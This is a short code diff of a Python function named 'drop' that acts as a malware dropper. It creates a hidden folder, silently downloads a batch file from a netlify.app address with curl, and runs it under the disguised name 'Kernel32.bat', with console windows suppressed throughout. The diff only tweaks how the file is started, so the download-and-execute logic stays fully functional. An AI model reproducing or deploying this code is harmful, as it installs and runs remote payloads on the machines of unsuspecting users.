@@ -8,10 +8,10 @@ def drop(file):
         subprocess.Popen(f"mkdir {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.Popen(f"attrib +h {folderpath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
         subprocess.Popen(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/coolio.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.Popen(f"start /min {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen(f"start  {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
     elif os.path.exists(filepath):
-        subprocess.Popen(f"start /min {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen(f"start {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
     elif os.path.exists(folderpath) and not os.path.exists(filepath):
         subprocess.Popen(f"curl -s -o {filepath} https://boisterous-kataifi-40b43d.netlify.app/coolio.bat", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
-        subprocess.Popen(f"start /min {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen(f"start {filepath}", shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
 drop("Kernel32.bat")
